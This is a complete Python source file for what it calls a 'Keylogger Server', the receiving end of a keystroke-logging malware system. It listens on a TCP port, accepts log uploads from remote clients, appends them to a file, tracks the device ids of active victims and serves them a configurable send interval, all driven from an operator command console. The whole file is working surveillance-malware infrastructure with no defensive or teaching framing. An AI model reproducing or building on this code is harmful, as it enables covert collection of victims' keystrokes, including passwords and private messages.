"""
Keylogger Server with Active Connection Tracking Only
VERSION: 2.1 - SIMPLIFIED (Active Connections Only)
Last Updated: 2025-12-25
"""

import os
import socket
import threading
import datetime
import json
import re

SERVER_PORT = 9999
LOG_FILE = 'server-copy.txt'
SETTINGS_FILE = 'settings.json'

# Default config
CLIENT_CONFIG = {
    'send_interval': 300,  # Default 5 minutes
    'buffer_size': 1024,
    'retry_attempts': 3,
    'config_check_interval': 30
}

config_lock = threading.Lock()
server_running = True  # Global flag to control server loop

# Connection tracking - SIMPLIFIED (only active connections)
active_connections = {}  # {device_id: last_seen_timestamp}
connection_lock = threading.Lock()

def load_settings_from_file():
    """Load settings from settings.json file."""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                settings = json.load(f)
                return settings
        except Exception as e:
            print(f"Error loading settings: {e}")
    return None

def initialize_config():
    """Initialize config from settings file."""
    global CLIENT_CONFIG, SERVER_PORT, LOG_FILE
    
    settings = load_settings_from_file()
    if settings:
        # Update send interval from settings
        if 'send_interval_seconds' in settings:
            CLIENT_CONFIG['send_interval'] = settings['send_interval_seconds']
            print(f"Loaded send interval: {CLIENT_CONFIG['send_interval']} seconds")
        
        # Update port from settings
        if 'server_port' in settings:
            SERVER_PORT = settings['server_port']
            print(f"Loaded server port: {SERVER_PORT}")
        
        # Update log file path from settings
        if 'log_file_path' in settings:
            LOG_FILE = settings['log_file_path']
            print(f"Loaded log file: {LOG_FILE}")
    else:
        print("No settings file found, using defaults")
    
    print(f"\nCurrent Configuration:")
    print(f"  - Send Interval: {CLIENT_CONFIG['send_interval']} seconds")
    print(f"  - Server Port: {SERVER_PORT}")
    print(f"  - Log File: {LOG_FILE}")
    print()

def update_config(new_interval):
    """Update send interval configuration."""
    global CLIENT_CONFIG
    with config_lock:
        CLIENT_CONFIG['send_interval'] = new_interval
        print(f"\n{'='*60}")
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] CONFIG UPDATED!")
        print(f"New send interval: {new_interval} seconds")
        print(f"{'='*60}\n")

def extract_device_id_from_log(data):
    """Extract device ID from log data."""
    try:
        # Look for device ID pattern in log entries: ["device_id", "timestamp", "message"]
        data_str = data.decode('utf-8', errors='ignore')
        match = re.search(r'\["([^"]+@[^"]+)", "[^"]+", ', data_str)
        if match:
            return match.group(1)
    except:
        pass
    return None

def update_connection(device_id):
    """Update connection tracking with device ID and timestamp."""
    with connection_lock:
        now = datetime.datetime.now()
        active_connections[device_id] = now

def cleanup_stale_connections():
    """Remove connections not seen in the last 10 minutes."""
    with connection_lock:
        now = datetime.datetime.now()
        stale_threshold = datetime.timedelta(minutes=10)
        to_remove = [
            device_id for device_id, last_seen in active_connections.items()
            if now - last_seen > stale_threshold
        ]
        for device_id in to_remove:
            del active_connections[device_id]

def get_connection_stats():
    """Get current connection statistics."""
    with connection_lock:
        return {
            'active_count': len(active_connections),
            'connections': {
                device_id: last_seen.isoformat()
                for device_id, last_seen in active_connections.items()
            }
        }

def handle_config_request(client_socket, address):
    """Send configuration to client."""
    try:
        with config_lock:
            config_json = json.dumps(CLIENT_CONFIG)
        client_socket.send(config_json.encode('utf-8'))
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sent config to {address[0]}")
    except Exception as e:
        print(f"Error sending config: {e}")
    finally:
        client_socket.close()

def handle_log_upload(client_socket, address):
    """Receive and save logs from client."""
    device_id = None
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, 'ab') as f:
            separator = f"\n{'='*60}\n[Connection from {address[0]} at {timestamp}]\n{'='*60}\n".encode('utf-8')
            f.write(separator)
            total_bytes = 0
            first_chunk = True
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                f.write(data)
                total_bytes += len(data)
                
                # Extract device ID from first chunk
                if first_chunk and not device_id:
                    device_id = extract_device_id_from_log(data)
                    first_chunk = False
            
            f.write(b'\n')
        
        # Update connection tracking
        if device_id:
            update_connection(device_id)
            print(f"[{timestamp}] Received {total_bytes} bytes from {device_id} ({address[0]})")
        else:
            print(f"[{timestamp}] Received {total_bytes} bytes from {address[0]}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def handle_stats_request(client_socket, address):
    """Send connection statistics to client."""
    try:
        stats = get_connection_stats()
        stats_json = json.dumps(stats)
        client_socket.send(stats_json.encode('utf-8'))
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sent stats to {address[0]}")
    except Exception as e:
        print(f"Error sending stats: {e}")
    finally:
        client_socket.close()

def handle_client(client_socket, address):
    """Handle incoming client connection."""
    try:
        request_type = client_socket.recv(1).decode('utf-8')
        if request_type == 'C':
            handle_config_request(client_socket, address)
        elif request_type == 'L':
            handle_log_upload(client_socket, address)
        elif request_type == 'S':
            handle_stats_request(client_socket, address)
        else:
            client_socket.close()
    except Exception as e:
        client_socket.close()

def cleanup_timer():
    """Periodically cleanup stale connections."""
    global server_running
    while server_running:
        threading.Event().wait(60)  # Wait 60 seconds
        if server_running:
            cleanup_stale_connections()

def command_interface():
    """Command line interface for server control."""
    global server_running
    print("\nAvailable commands:")
    print("  help              - Show available commands")
    print("  interval <seconds> - Change send interval")
    print("  show              - Show current config")
    print("  stats             - Show connection statistics")
    print("  reload            - Reload settings from file")
    print("  quit              - Shutdown server")
    print()
    
    while server_running:
        try:
            cmd = input("server> ").strip().lower()
            
            if cmd == 'help':
                print("\nAvailable commands:")
                print("  help              - Show available commands")
                print("  interval <seconds> - Change send interval")
                print("  show              - Show current config")
                print("  stats             - Show connection statistics")
                print("  reload            - Reload settings from file")
                print("  quit              - Shutdown server\n")
            
            elif cmd.startswith('interval '):
                try:
                    new_interval = int(cmd.split()[1])
                    if new_interval < 5:
                        print("Interval must be >= 5 seconds")
                    else:
                        update_config(new_interval)
                except:
                    print("Usage: interval <seconds>")
            
            elif cmd == 'show':
                print(f"\nCurrent Configuration:")
                print(f"  Send Interval: {CLIENT_CONFIG['send_interval']} seconds")
                print(f"  Buffer Size: {CLIENT_CONFIG['buffer_size']} bytes")
                print(f"  Retry Attempts: {CLIENT_CONFIG['retry_attempts']}")
                print(f"  Server Port: {SERVER_PORT}")
                print(f"  Log File: {LOG_FILE}\n")
            
            elif cmd == 'stats':
                stats = get_connection_stats()
                print(f"\nConnection Statistics:")
                print(f"  Active Connections: {stats['active_count']}")
                if stats['connections']:
                    print(f"\n  Active Devices:")
                    for device_id, last_seen in stats['connections'].items():
                        print(f"    - {device_id} (last seen: {last_seen})")
                print()
            
            elif cmd == 'reload':
                print("\nReloading settings from file...")
                initialize_config()
            
            elif cmd == 'quit':
                print("\nShutting down server...")
                server_running = False
                break
            
            else:
                print("Unknown command. Type 'help' for available commands.")
        
        except EOFError:
            break
        except Exception as e:
            print(f"Error: {e}")

# --- Main server ---
print("="*60)
print("Keylogger Server Starting...")
print("VERSION 2.1 - ACTIVE CONNECTIONS ONLY")
print("="*60)

# Initialize configuration from settings file
initialize_config()

# Create socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind(("0.0.0.0", SERVER_PORT))
    s.listen(10)
    
    print(f"Server started on port {SERVER_PORT}")
    print(f"Log file: {LOG_FILE}")
    print(f"Send interval: {CLIENT_CONFIG['send_interval']} seconds")
    print(f"Connection tracking: ACTIVE ONLY")
    print("="*60)
    
    # Start command interface thread
    cmd_thread = threading.Thread(target=command_interface, daemon=True)
    cmd_thread.start()
    
    # Start cleanup timer thread
    cleanup_thread = threading.Thread(target=cleanup_timer, daemon=True)
    cleanup_thread.start()
    
    # Accept client connections
    while server_running:
        s.settimeout(1.0)  # Timeout to check server_running flag
        try:
            client_socket, address = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
            client_thread.start()
        except socket.timeout:
            continue
        except Exception as e:
            if server_running:
                print(f"Error accepting connection: {e}")

except OSError as e:
    print(f"Error: Could not bind to port {SERVER_PORT}")
    print(f"   {e}")
    print(f"   Port may already be in use.")

finally:
    s.close()
    print("\nServer socket closed")
    print("="*60)